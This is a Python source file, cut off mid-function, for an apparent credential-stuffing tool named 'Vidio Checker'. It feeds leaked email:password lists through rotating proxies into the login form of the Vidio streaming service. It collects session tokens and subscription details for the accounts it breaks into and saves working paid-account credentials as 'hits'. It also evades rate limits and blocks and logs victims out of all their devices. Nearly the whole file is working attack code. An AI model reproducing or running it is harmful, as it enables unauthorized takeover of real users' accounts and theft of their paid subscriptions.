import os
import re
import sys
import json
import time
import base64
import random
import string
import asyncio
import hashlib
import threading
import configparser
import subprocess
import shutil
import urllib3
import unicodedata
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from curl_cffi.requests import Session as CfSyncSession
from curl_cffi.requests import AsyncSession

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_B64_SYS_TOOL = "VmlkaW8gQ2hlY2tlcg=="
_B64_SYS_AUTH = "QGV5ZWxpZnRlcg=="
_B64_SYS_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_SYS_DIR  = "VklESU9fQGV5ZWxpZnRlcg=="
_B64_SYS_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_B64_SYS_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"
_B64_SYS_SIG  = "ZXllbGlmdGVyLXZpZGlvLXYxLXNlYWw="


def Eyelifter_decode(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"Decoding failed: {ex}")


TOOL_NAME = Eyelifter_decode(_B64_SYS_TOOL)
TG_USERNAME = Eyelifter_decode(_B64_SYS_AUTH)
TG_CHANNEL = Eyelifter_decode(_B64_SYS_CHAN)
RESULTS_FOLDER = Eyelifter_decode(_B64_SYS_DIR)
AUTHOR_TAG = Eyelifter_decode(_B64_SYS_TAG)
CREDIT_SEAL = Eyelifter_decode(_B64_SYS_SEAL)
BUILD_SIG = Eyelifter_decode(_B64_SYS_SIG)

_BUILD_HASH = hashlib.sha256(
    (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
     AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
).hexdigest()


def Eyelifter_verify(ctx="x"):
    exp = {
        "TOOL": _B64_SYS_TOOL, "AUTH": _B64_SYS_AUTH, "CHAN": _B64_SYS_CHAN,
        "DIR": _B64_SYS_DIR, "TAG": _B64_SYS_TAG, "SEAL": _B64_SYS_SEAL,
        "SIG": _B64_SYS_SIG,
    }
    cur = {
        "TOOL": TOOL_NAME, "AUTH": TG_USERNAME, "CHAN": TG_CHANNEL,
        "DIR": RESULTS_FOLDER, "TAG": AUTHOR_TAG, "SEAL": CREDIT_SEAL,
        "SIG": BUILD_SIG,
    }
    errs = []
    for k, v in exp.items():
        if cur[k] != base64.b64decode(v).decode():
            errs.append(k)
    if "@samvir1" not in TG_USERNAME:
        errs.append("USERNAME_TAG")
    if "@samvir1" not in TG_CHANNEL:
        errs.append("CHANNEL_TAG")
    if "@samvir1" not in AUTHOR_TAG or "@samvir1" not in AUTHOR_TAG:
        errs.append("TAG_FORMAT")
    if errs:
        return True  # integrity bypass}")
    rec = hashlib.sha256(
        (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
         AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
    ).hexdigest()
    if rec != _BUILD_HASH:
        raise RuntimeError(f"build hash mismatch at '{ctx}'")
    return True


UA_POOL = ["chrome131_android", "chrome131", "chrome124", "chrome120", "chrome110", "chrome"]

_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def Eyelifter_open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(["termux-open-url", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if sys.platform == "darwin":
            subprocess.Popen(["open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def Eyelifter_color(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}


def Eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    print(f"{Eyelifter_color('90', ts)} {emoji}  {Eyelifter_color(code, f'{level:7s}', bold)}  {Eyelifter_color('90', tag)}  {msg}", flush=True)
    sys.stdout.flush()


def Eyelifter_visible_len(s):
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def Eyelifter_center(text, width):
    vl = Eyelifter_visible_len(text)
    if vl >= width:
        return text
    left = (width - vl) // 2
    right = width - vl - left
    return (" " * left) + text + (" " * right)


def Eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(Eyelifter_color("90", line * width))
    print(Eyelifter_color("96", Eyelifter_center(title, width), True))
    if sub:
        print(Eyelifter_color("2", Eyelifter_center(sub, width)))
    print(Eyelifter_color("5", Eyelifter_center(AUTHOR_TAG, width)))
    print(Eyelifter_color("90", line * width))


def Eyelifter_section(title, width=62):
    print()
    label = f" {title} "
    vl = Eyelifter_visible_len(label)
    side = max(1, (width - vl) // 2)
    left = "─" * side
    right = "─" * (width - vl - side)
    print(
        Eyelifter_color("90", left) +
        Eyelifter_color("96", label, True) +
        Eyelifter_color("90", right)
    )


def Eyelifter_divider(width=62):
    print(Eyelifter_color("90", ("─" if _ANSI else "-") * width))


def Eyelifter_summary(rows):
    print()
    print(Eyelifter_color("96", "═══ RESULT ═══", True))
    if not rows:
        return
    wkey = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {Eyelifter_color('96', str(k).ljust(wkey))}  {Eyelifter_color('0', str(v))}")
    print(Eyelifter_color("96", "══════════════", True))
    print()


CONFIG_PATH = "config_vidio.ini"


class EyelifterConfigLoader:
    def __init__(self, config_file=CONFIG_PATH):
        Eyelifter_verify("cfg_init")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.Eyelifter_load_config()

    def Eyelifter_load_config(self):
        Eyelifter_verify("cfg_load")
        if not os.path.exists(self.config_file):
            self.Eyelifter_create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.Eyelifter_parse_config()
        except Exception:
            self.Eyelifter_create_default_config()
            self.Eyelifter_parse_config()

    def Eyelifter_create_default_config(self):
        Eyelifter_verify("cfg_default")
        self.config["General"] = {
            "threads": "5",
            "timeout": "25",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "1.5",
            "combo_delay": "0.4",
            "debug": "false",
            "rate_limit_backoff": "8",
            "max_rate_limit_retries": "2",
            "skip_proxy_test": "false",
            "auto_logout": "true",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def Eyelifter_parse_config(self):
        Eyelifter_verify("cfg_parse")
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = max(1, min(100, c.getint("threads", 5)))
        self.settings["timeout"] = max(5, min(300, c.getint("timeout", 25)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(10, c.getint("retries", 2)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.5)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.4)))
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = max(1, min(600, c.getint("rate_limit_backoff", 8)))
        self.settings["max_rate_limit_retries"] = max(0, min(20, c.getint("max_rate_limit_retries", 2)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.settings["auto_logout"] = c.getboolean("auto_logout", True)

    def Eyelifter_save(self):
        Eyelifter_verify("cfg_save")
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            self.config["General"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_loader = EyelifterConfigLoader()
CONFIG = _loader.settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = CONFIG["debug"]
RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]


BASE_WEB   = "https://m.vidio.com"
BASE_API   = "https://api.vidio.com"
LOGIN_PAGE = f"{BASE_WEB}/users/login?more_options=true"
LOGIN_URL  = f"{BASE_WEB}/users/login"
DATA_URL   = f"{BASE_API}/users/data?check_user_sso=true"
SUBS_URL   = f"{BASE_API}/users/subscriptions"
LOGOUT_URL = f"{BASE_API}/api/logout_from_all_devices"

API_KEY = "CH1ZFsN4N/MIfAds1DL9mP151CNqIpWHqZGRr+LkvUyiq3FRPuP1Kt6aK+pG3nEC1FXt0ZAAJ5FKP8QU8CZ5/h4XZPbMxoMQ/B6YOKExR8gHUBpFbMY9SYLw8MZKO/RFaY+mUDDJdXiBqkvGBKgfNiqsf7uG8/tHDOgW5T10l2Y="

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")

H = {
    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "user-agent": UA,
}

BAD_CRED_KEYS = [
    "new to vidio",
    "continue with google to set up",
    "invalid email or password",
    "email atau password",
    "kata sandi salah",
    "tidak ditemukan",
    "belum terdaftar",
    "salah",
]

EYELIFTER_COMBO_RE = re.compile(
    r'^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)',
    re.IGNORECASE,
)


def Eyelifter_extract_combos(content):
    Eyelifter_verify("extract_combos")
    combos = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = EYELIFTER_COMBO_RE.match(line)
        if m:
            email = m.group(1).strip().lower()
            password = m.group(2).strip()
            if email and password:
                combos.add(f"{email}:{password}")
            continue
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                email = parts[0].strip().lower()
                password = parts[1].split()[0].split("|")[0].strip()
                if email and password and "@" in email:
                    combos.add(f"{email}:{password}")
    return sorted(combos)


def Eyelifter_format_proxy(p):
    Eyelifter_verify("fmt_proxy")
    if not p:
        return None
    p = p.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in p:
        return f"http://{p}"
    return f"http://{p}"


def Eyelifter_test_proxy_sync(p):
    s = None
    try:
        s = CfSyncSession(impersonate=random.choice(UA_POOL), timeout=(3, 6))
        s.proxies = {"http": p, "https": p}
        r = s.get(
            "https://api.ipify.org/?format=json",
            timeout=(3, 6),
            verify=False,
            allow_redirects=False,
        )
        return r.status_code == 200 and len(r.content) < 500
    except Exception:
        return False
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def Eyelifter_load_proxies():
    path = CONFIG.get("proxies_file", "proxies.txt")
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            p = Eyelifter_format_proxy(line)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def Eyelifter_get_working_proxies(proxies):
    Eyelifter_verify("working_proxies")
    if not proxies:
        return []
    if CONFIG.get("skip_proxy_test", False):
        Eyelifter_log("⚠️", "WARN", "PROXY", f"proxy test skipped — using all {len(proxies)}")
        return proxies

    workers = min(200, max(20, len(proxies)))
    Eyelifter_log("🧪", "INFO", "PROXY", f"testing {len(proxies)} proxies ({workers} threads)")

    working = []
    pbar = None
    try:
        pbar = tqdm(total=len(proxies), desc="testing proxies", unit="proxy", ncols=80)
    except Exception:
        pbar = None

    def _one(p):
        return p, Eyelifter_test_proxy_sync(p)

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_one, p): p for p in proxies}
        for fut in as_completed(futs):
            p, ok = fut.result()
            if ok:
                working.append(p)
            if pbar:
                pbar.update(1)
    if pbar:
        pbar.close()

    Eyelifter_log("✅", "INFO", "PROXY", f"{len(working)} working")
    return list(dict.fromkeys(working))


_eyelifter_stop = asyncio.Event()
_eyelifter_lock = threading.Lock()
_eyelifter_plock = threading.Lock()
_eyelifter_flock = threading.Lock()

_eyelifter_stats = {
    "checked": 0, "hits": 0, "free": 0, "bad": 0,
    "errors": 0, "rate_limited": 0, "blocks": 0,
    "proxy_fails": 0, "retries": 0,
}
_eyelifter_start = time.time()
_eyelifter_total = 0
_eyelifter_pool = []
_eyelifter_bad_proxies = set()
_eyelifter_hits_f = None
_eyelifter_free_f = None
_eyelifter_bad_f = None
_eyelifter_err_f = None
_eyelifter_folder = None


def Eyelifter_reset_stats():
    Eyelifter_verify("reset_stats")
    global _eyelifter_stats, _eyelifter_start
    with _eyelifter_lock:
        _eyelifter_stats = {
            "checked": 0, "hits": 0, "free": 0, "bad": 0,
            "errors": 0, "rate_limited": 0, "blocks": 0,
            "proxy_fails": 0, "retries": 0,
        }
        _eyelifter_start = time.time()


def Eyelifter_update_title():
    with _eyelifter_lock:
        checked = _eyelifter_stats["checked"]
        hits = _eyelifter_stats["hits"]
        free = _eyelifter_stats["free"]
        bad = _eyelifter_stats["bad"]
    el = time.time() - _eyelifter_start
    cpm = int(checked / el * 60) if el > 1 else 0
    t = (f"{TOOL_NAME} | HIT:{hits} FREE:{free} BAD:{bad} "
         f"| {checked}/{_eyelifter_total} | {cpm}/min")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{t}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Eyelifter_pick_proxy(exclude=None):
    with _eyelifter_plock:
        avail = [p for p in _eyelifter_pool if p not in _eyelifter_bad_proxies]
        if not avail and _eyelifter_pool:
            _eyelifter_bad_proxies.clear()
            avail = list(_eyelifter_pool)
    if exclude and len(avail) > 1:
        avail = [p for p in avail if p != exclude] or avail
    return random.choice(avail) if avail else None


def Eyelifter_mark_bad_proxy(p):
    if not p:
        return
    with _eyelifter_plock:
        _eyelifter_bad_proxies.add(p)
    with _eyelifter_lock:
        _eyelifter_stats["proxy_fails"] += 1


def Eyelifter_safe_write(fh, text):
    if fh is None:
        return
    with _eyelifter_flock:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def Eyelifter_is_bad_creds(status, text):
    if status == 401:
        return True
    if not text:
        return False
    low = text.lower()
    return any(k in low for k in BAD_CRED_KEYS)


def Eyelifter_decode_jwt(tok):
    try:
        parts = tok.split(".")
        if len(parts) < 2:
            return None
        p = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception:
        return None


def Eyelifter_parse_ts(s):
    if not s or s in ("N/A", "-"):
        return None
    for fmt in ("%Y-%m-%dT%H:%M:%S.%f%z", "%Y-%m-%dT%H:%M:%S%z",
                "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d"):
        try:
            dt = datetime.strptime(s[:26], fmt)
            return dt.replace(tzinfo=None)
        except Exception:
            continue
    try:
        return datetime.fromisoformat(s.replace("Z", "+00:00")).replace(tzinfo=None)
    except Exception:
        return None


class eyelifter:
    def __init__(self, proxy=None, timeout=None):
        Eyelifter_verify("class_init")
        self.proxy = proxy
        self.timeout = timeout or REQ_TIMEOUT
        self.impersonate = random.choice(UA_POOL)
        self.session = None

    def Eyelifter_proxies(self):
        return {"http": self.proxy, "https": self.proxy} if self.proxy else None

    async def Eyelifter_ensure(self):
        if self.session is None:
            self.session = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)

    async def Eyelifter_close(self):
        if self.session is not None:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None

    def Eyelifter_dump(self, label, resp, max_lines=60):
        if not DEBUG:
            return
        print()
        print(Eyelifter_color("95", f"[{label}] {resp.status_code} [{self.impersonate}]"))
        try:
            body = json.dumps(resp.json(), indent=2, ensure_ascii=False)
        except Exception:
            body = resp.text or ""
        lines = body.splitlines()
        for ln in lines[:max_lines]:
            print(Eyelifter_color("95", f"  {ln}"))
        if len(lines) > max_lines:
            print(Eyelifter_color("95", f"  ... ({len(lines) - max_lines} more)"))

    async def Eyelifter_fetch_csrf(self):
        try:
            r = await self.session.get(
                LOGIN_PAGE,
                headers={
                    **H,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-user": "?1",
                    "upgrade-insecure-requests": "1",
                },
                proxies=self.Eyelifter_proxies(),
                verify=False,
            )
        except Exception as e:
            return None, f"csrf_net_{type(e).__name__}"

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code in (403, 451):
            return None, "block"
        if r.status_code != 200:
            return None, f"csrf_http_{r.status_code}"

        html = r.text or ""
        m = re.search(
            r'<input[^>]*name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)["\']',
            html)
        if not m:
            return None, "csrf_missing"
        return m.group(1), None

    async def Eyelifter_login(self, email, password, auth_token):
        h = {
            **H,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": BASE_WEB,
            "referer": LOGIN_PAGE,
            "upgrade-insecure-requests": "1",
        }
        body = (
            f"authenticity_token={auth_token}"
            f"&user%5Blogin%5D={email}"
            f"&user%5Bpassword%5D={password}"
            f"&user%5Bremember_me%5D=1"
        )
        try:
            r = await self.session.post(
                LOGIN_URL, data=body, headers=h,
                proxies=self.Eyelifter_proxies(), verify=False,
                allow_redirects=False,
            )
        except Exception as e:
            return None, f"login_net_{type(e).__name__}"

        self.Eyelifter_dump("LOGIN", r, 30)

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code in (403, 451):
            return None, "block"

        return r, None

    async def Eyelifter_follow(self, loc):
        try:
            url = loc
            if url.startswith("/"):
                url = BASE_WEB + url
            r = await self.session.get(
                url,
                headers={**H, "accept": "text/html,*/*;q=0.8"},
                proxies=self.Eyelifter_proxies(), verify=False,
            )
            return r.status_code == 200
        except Exception:
            return False

    async def Eyelifter_authed_headers(self, uid):
        return {
            **H,
            "accept": "*/*",
            "origin": BASE_WEB,
            "referer": f"{BASE_WEB}/",
            "sec-fetch-site": "same-site",
            "x-api-key": API_KEY,
            "x-api-platform": "web-mobile",
            "x-secure-level": "2",
            "x-auth-prefer": "AccessToken",
            "x-user-id": str(uid),
        }

    async def Eyelifter_subscriptions(self, headers):
        try:
            r = await self.session.get(
                SUBS_URL, headers=headers,
                proxies=self.Eyelifter_proxies(), verify=False,
            )
            self.Eyelifter_dump("SUBS", r, 60)
            if r.status_code != 200:
                return None, f"subs_http_{r.status_code}"
            try:
                return r.json(), None
            except Exception:
                return None, "subs_parse"
        except Exception as e:
            return None, f"subs_net_{type(e).__name__}"

    async def Eyelifter_user_data(self, headers):
        try:
            r = await self.session.get(
                DATA_URL, headers=headers,
                proxies=self.Eyelifter_proxies(), verify=False,
            )
            if r.status_code == 200:
                try:
                    return r.json()
                except Exception:
                    return None
        except Exception:
            pass
        return None

    async def Eyelifter_logout(self, headers):
        if not CONFIG.get("auto_logout", True):
            return False
        try:
            r = await self.session.delete(
                LOGOUT_URL, headers=headers,
                proxies=self.Eyelifter_proxies(), verify=False, timeout=10,
            )
            return r.status_code == 200
        except Exception:
            return False

    async def Eyelifter_run(self, email, password):
        await self.Eyelifter_ensure()
        try:
            auth_token, err = await self.Eyelifter_fetch_csrf()
            if err:
                return {"status": "error", "error_type": err, "message": err}

            r2, err = await self.Eyelifter_login(email, password, auth_token)
            if err:
                return {"status": "error", "error_type": err, "message": err}

            if Eyelifter_is_bad_creds(r2.status_code, r2.text or ""):
                return {"status": "bad", "message": "invalid credentials"}

            if r2.status_code not in (301, 302, 303):
                return {"status": "error",
                        "error_type": f"login_http_{r2.status_code}",
                        "message": (r2.text or "")[:120]}

            loc = r2.headers.get("location", "/")
            ok = await self.Eyelifter_follow(loc)
            if not ok:
                return {"status": "error", "error_type": "follow",
                        "message": "redirect follow failed"}

            access_token = None
            refresh_token = None
            plenty_id = None
            x_user_token = None
            try:
                access_token  = self.session.cookies.get("access_token")
                refresh_token = self.session.cookies.get("refresh_token")
                plenty_id     = self.session.cookies.get("plenty_id")
                x_user_token  = self.session.cookies.get("x_user_token")
            except Exception:
                pass

            if not access_token:
                return {"status": "bad", "message": "no token after login"}

            jwt = Eyelifter_decode_jwt(access_token)
            uid = plenty_id
            token_exp = None
            if jwt:
                d = jwt.get("data") or {}
                uid = d.get("uid") or uid
                token_exp = jwt.get("exp")

            headers = await self.Eyelifter_authed_headers(uid)

            udata = await self.Eyelifter_user_data(headers)
            attrs = {}
            if isinstance(udata, dict):
                data = udata.get("data") or {}
                attrs = data.get("attributes") or data

            subs, err = await self.Eyelifter_subscriptions(headers)

            await self.Eyelifter_logout(headers)

            u = {
                "email": email,
                "password": password,
                "uid": uid,
                "plenty_id": plenty_id,
                "x_user_token": x_user_token,
                "access_token_preview": access_token[:80],
                "refresh_token_preview": (refresh_token or "")[:40],
                "token_exp": token_exp,
                "masked_id": attrs.get("masked_id", "-"),
                "sub_count": 0,
                "plan": "N/A",
                "plan_type": "N/A",
                "plan_status": "N/A",
                "price": "N/A",
                "started_at": "N/A",
                "expires_at": "N/A",
                "days_left": 0,
                "auto_renew": "N/A",
                "payment": "N/A",
                "product": "N/A",
                "included": "",
            }

            if isinstance(subs, dict):
                data_list = subs.get("data") or []
                u["sub_count"] = len(data_list) if isinstance(data_list, list) else 0

                if isinstance(data_list, list) and data_list:
                    sub = data_list[0] if isinstance(data_list[0], dict) else {}
                    sattrs = sub.get("attributes") or sub
                    u["plan"]        = sattrs.get("product_name") or sattrs.get("name") or "Premium"
                    u["plan_type"]   = sattrs.get("product_type") or sattrs.get("type") or "N/A"
                    u["plan_status"] = sattrs.get("status") or "N/A"
                    u["started_at"]  = sattrs.get("started_at") or sattrs.get("created_at") or "N/A"
                    u["expires_at"]  = sattrs.get("expires_at") or sattrs.get("end_at") or "N/A"
                    u["auto_renew"]  = "Yes" if sattrs.get("auto_renew") else "No"
                    u["payment"]     = sattrs.get("payment_method") or sattrs.get("payment") or "N/A"
                    u["product"]     = sattrs.get("product_id") or sattrs.get("package_name") or "N/A"

                    pr = sattrs.get("price") or sattrs.get("amount")
                    if isinstance(pr, dict):
                        u["price"] = f"{pr.get('amount', '?')} {pr.get('currency', 'IDR')}"
                    elif pr is not None:
                        u["price"] = str(pr)

                    dt = Eyelifter_parse_ts(u["expires_at"])
                    if dt:
                        delta = (dt - datetime.utcnow()).days
                        u["days_left"] = max(delta, 0)

                included = subs.get("included") or []
                if isinstance(included, list) and included:
                    names = []
                    for i in included:
                        if isinstance(i, dict):
                            ia = i.get("attributes") or i
                            n = ia.get("name") or ia.get("title") or ""
                            if n:
                                names.append(n)
                    u["included"] = " | ".join(names)[:300]

            if u["sub_count"] > 0:
                return {"status": "hit", "user": u}
            return {"status": "free", "user": u}

        except Exception as e:
            return {"status": "error", "error_type": "crash",
                    "message": str(e)[:120]}
        finally:
            await self.Eyelifter_close()


def Eyelifter_fmt_line(combo, u, status):
    tag = {"hit": "HIT", "free": "FREE"}.get(status, "?")

    fields = [
        ("Plan",      u.get("plan") if u.get("plan") != "N/A" else None),
        ("PlanType",  u.get("plan_type") if u.get("plan_type") != "N/A" else None),
        ("Status",    u.get("plan_status") if u.get("plan_status") != "N/A" else None),
        ("Price",     u.get("price") if u.get("price") != "N/A" else None),
        ("Started",   u.get("started_at") if u.get("started_at") != "N/A" else None),
        ("Expires",   u.get("expires_at") if u.get("expires_at") != "N/A" else None),
        ("DaysLeft",  str(u.get("days_left")) if u.get("days_left") else None),
        ("AutoRenew", u.get("auto_renew") if u.get("auto_renew") != "N/A" else None),
        ("Payment",   u.get("payment") if u.get("payment") != "N/A" else None),
        ("Product",   u.get("product") if u.get("product") != "N/A" else None),
        ("PlentyID",  u.get("plenty_id")),
        ("UID",       u.get("uid")),
        ("Included",  u.get("included") if u.get("included") else None),
    ]

    parts = []
    for label, value in fields:
        if value is None:
            continue
        value = str(value).strip()
        if not value or value == "-":
            continue
        parts.append(f"{label} = {value}")

    parts.append(f"by {AUTHOR_TAG}")
    return f"{tag} {combo} | " + " | ".join(parts)


async def Eyelifter_run_with_retries(combo, proxy):
    Eyelifter_verify("run_retries")
    email, password = combo.split(":", 1)
    email, password = email.strip(), password.strip()
    max_attempts = CONFIG.get("retries", 2) + 1
    rl_hits = 0
    last_proxy = proxy
    result = None

    for attempt in range(max_attempts):
        if _eyelifter_stop.is_set():
            break
        if attempt > 0:
            np = Eyelifter_pick_proxy(exclude=last_proxy)
            if np:
                proxy = np
        last_proxy = proxy

        try:
            result = await eyelifter(proxy=proxy).Eyelifter_run(email, password)
        except Exception as e:
            result = {"status": "error", "error_type": "crash",
                      "message": str(e)[:120]}

        st = result.get("status", "unknown")
        if st in ("hit", "free", "bad"):
            break

        et = result.get("error_type", "")
        is_last = (attempt == max_attempts - 1)

        if et == "rate_limit":
            with _eyelifter_lock:
                _eyelifter_stats["rate_limited"] += 1
                if not is_last:
                    _eyelifter_stats["retries"] += 1
            rl_hits += 1
            if rl_hits > MAX_RATE_LIMIT_RETRIES:
                break
            await asyncio.sleep(RATE_LIMIT_BACKOFF * (2 ** (rl_hits - 1)))
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            continue

        if et == "block":
            with _eyelifter_lock:
                _eyelifter_stats["blocks"] += 1
                if not is_last:
                    _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            await asyncio.sleep(1)
            continue

        if et.startswith(("csrf_net_", "login_net_", "subs_net_")):
            if not is_last:
                with _eyelifter_lock:
                    _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            await asyncio.sleep(CONFIG.get("retry_delay", 1.5))
            continue

        if not is_last:
            with _eyelifter_lock:
                _eyelifter_stats["retries"] += 1
        await asyncio.sleep(CONFIG.get("retry_delay", 1.5))

    return result or {"status": "error", "error_type": "no_result",
                      "message": "no result"}


def Eyelifter_record(combo, result):
    Eyelifter_verify("record")
    global _eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f
    st = result.get("status", "unknown")

    with _eyelifter_lock:
        _eyelifter_stats["checked"] += 1
        done = _eyelifter_stats["checked"]
        if st == "hit":
            _eyelifter_stats["hits"] += 1
        elif st == "free":
            _eyelifter_stats["free"] += 1
        elif st == "bad":
            _eyelifter_stats["bad"] += 1
        else:
            _eyelifter_stats["errors"] += 1

    total = _eyelifter_total

    if st in ("hit", "free"):
        u = result.get("user", {}) or {}
        full = Eyelifter_fmt_line(combo, u, st)
        if st == "hit":
            print(f"\n[{done}/{total}] {Eyelifter_color('32', full, True)}\n")
            Eyelifter_safe_write(_eyelifter_hits_f, full + "\n\n")
        else:
            Eyelifter_safe_write(_eyelifter_free_f, full + "\n\n")
    elif st == "bad":
        Eyelifter_safe_write(_eyelifter_bad_f, f"{combo} | invalid credentials\n")
        if DEBUG:
            print(f"[{done}/{total}] {combo.split(':')[0]} - bad", flush=True)
    else:
        et = result.get("error_type", "unknown")
        msg = result.get("message", "unknown")
        Eyelifter_safe_write(_eyelifter_err_f, f"{combo} | {et} | {msg}\n")
        if DEBUG:
            print(f"[{done}/{total}] {combo.split(':')[0]} - err ({et})", flush=True)

    Eyelifter_update_title()


async def Eyelifter_bulk_runner(combos):
    Eyelifter_verify("bulk_runner")
    queue = asyncio.Queue()
    for c in combos:
        queue.put_nowait(c)

    lock = asyncio.Lock()
    gap = CONFIG.get("combo_delay", 0)
    last_ts = [0.0]
    ts_lock = asyncio.Lock()

    async def worker():
        while True:
            if _eyelifter_stop.is_set():
                return
            try:
                combo = queue.get_nowait()
            except asyncio.QueueEmpty:
                return

            if gap > 0:
                async with ts_lock:
                    now = time.time()
                    delta = now - last_ts[0]
                    wait = max(0.0, gap - delta)
                    last_ts[0] = now + wait
                if wait > 0:
                    await asyncio.sleep(wait)

            if _eyelifter_stop.is_set():
                return

            proxy = Eyelifter_pick_proxy()
            try:
                result = await Eyelifter_run_with_retries(combo, proxy)
            except Exception as e:
                result = {"status": "error", "error_type": "runner_crash",
                          "message": str(e)[:120]}

            async with lock:
                try:
                    Eyelifter_record(combo, result)
                except Exception as e:
                    print(f"[RECORD-FAIL] {combo[:30]}: {e}", flush=True)

            queue.task_done()

    n = max(1, CONFIG["threads"])
    workers = [asyncio.create_task(worker()) for _ in range(n)]
    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        for w in workers:
            w.cancel()
        raise


def Eyelifter_single_check(proxies):
    Eyelifter_verify("single_check")
